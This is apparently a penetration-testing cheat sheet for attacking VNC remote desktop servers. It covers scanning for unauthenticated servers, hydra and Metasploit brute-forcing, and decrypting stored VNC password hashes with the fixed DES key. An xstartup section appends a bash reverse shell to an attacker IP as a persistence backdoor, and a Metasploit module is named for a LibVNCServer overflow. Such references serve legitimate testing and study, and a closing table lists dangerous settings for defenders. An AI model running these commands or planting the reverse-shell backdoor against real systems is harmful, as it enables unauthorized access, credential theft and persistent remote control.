#VNC #VirtualNetworkComputing #remotedesktop #remoteaccess

## What is VNC?
Virtual Network Computing — cross-platform graphical remote desktop sharing system using RFB (Remote Framebuffer) protocol. Multiple implementations: TigerVNC, TightVNC, RealVNC, LibVNCServer. No encryption in base protocol (use SSH tunnel or VNC over TLS for security).

- Port: **TCP 5900** — VNC display :0
- Port: **TCP 5901** — VNC display :1 (first user session)
- Port: **TCP 5902+** — additional displays
- Port: **TCP 5800** — Java VNC web client (HTTP)
- Port: **TCP 6001** — X11 display (sometimes co-located)

---

## Enumeration

```bash
# Nmap
nmap -p 5900-5910 --script vnc-info,vnc-brute -sV <target>
nmap -p 5900 --script vnc-info <target>   # version + auth type

# Check auth type (none = immediate access)
nmap -p 5900 --script vnc-info <target> | grep -i "security\|auth"

# Metasploit
use auxiliary/scanner/vnc/vnc_login
use auxiliary/scanner/vnc/vnc_none_auth   # check for no-auth
```

---

## Connect / Access

```bash
# vncviewer (Linux)
vncviewer <target>
vncviewer <target>:5900
vncviewer <target>:1        # display :1 = port 5901
vncviewer <target>::5901    # explicit port

# With password
vncviewer -passwd /path/to/vncpasswd <target>

# TigerVNC
vncviewer <target>:5900

# xtigervncviewer
xtigervncviewer <target>:5900

# Remmina (GUI)
# Add connection → VNC → host:port

# Over SSH tunnel (if VNC only on localhost)
ssh -L 5901:127.0.0.1:5901 <user>@<target> -N
vncviewer 127.0.0.1:5901
```

---

## Attack Vectors

### No-Auth Check

```bash
# VNC Security Type 1 = None — no password required
nmap -p 5900 --script vnc-info <target> | grep "Security types"

# Metasploit — scan for no-auth VNC
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <target>/24
run

# If no auth — connect directly
vncviewer <target>
```

### Brute Force

```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://<target>
hydra -P passwords.txt <target> vnc

# Nmap
nmap -p 5900 --script vnc-brute --script-args passdb=passwords.txt <target>

# Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <target>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Screenshot Capture (No Interaction)

```bash
# Metasploit — capture screenshot without interaction
use auxiliary/scanner/vnc/vnc_none_auth
# if no-auth:
use post/multi/gather/screen_spy  # after session

# vncsnapshot (if available)
vncsnapshot <target>:0 screenshot.jpg

# scrot via VNC session
# Connect with vncviewer, then:
# applications → screenshot tool
```

### Encrypted Password Hash Extraction

```bash
# VNC stores password as DES-encrypted 8-byte hash
# Stored in:
# ~/.vnc/passwd (Linux)
# HKLM\SOFTWARE\RealVNC\vncserver\Password (Windows registry)
# C:\Users\<user>\AppData\Roaming\RealVNC\<version>\*.rfbauth

# Decrypt VNC password hash (fixed DES key used by most VNC implementations)
# msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt(["<hex_hash>"].pack('H*'), fixedkey)

# Online tools or:
# https://github.com/trinitronx/vncpasswd.py
python3 vncpasswd.py -d -H <hex_hash>
```

### xstartup Abuse (Post-Access Persistence/Escalation)

```bash
# ~/.vnc/xstartup runs when VNC session starts
# If writable, insert backdoor
cat >> ~/.vnc/xstartup << 'EOF'
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' &
EOF
# Next time VNC session starts, get reverse shell
```

### CVE-2019-15694 (LibVNCServer Heap Overflow)

```bash
# LibVNCServer < 0.9.12 — heap overflow via HandleCursorShape
# Allows RCE without authentication
use exploit/multi/vnc/libvncserver_client_cut_text
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No auth (Security Type: None) | Direct access without credentials |
| Weak password | Brute force (8-char max, DES-based) |
| VNC exposed to internet | Brute force, known CVEs |
| Writable `~/.vnc/xstartup` | Persistence and escalation |
| No encryption (plain RFB) | Credential and session sniffing |
| Old VNC version | Multiple RCE CVEs |

---

## Quick Reference

| Goal | Command |
|---|---|
| Check auth type | `nmap -p 5900 --script vnc-info host` |
| Check no-auth | `msf: auxiliary/scanner/vnc/vnc_none_auth` |
| Connect | `vncviewer host:5900` |
| Brute force | `hydra -P rockyou.txt vnc://host` |
| SSH tunnel | `ssh -L 5901:127.0.0.1:5901 user@host -N` |
| Decrypt passwd | `python3 vncpasswd.py -d -H <hash>` |
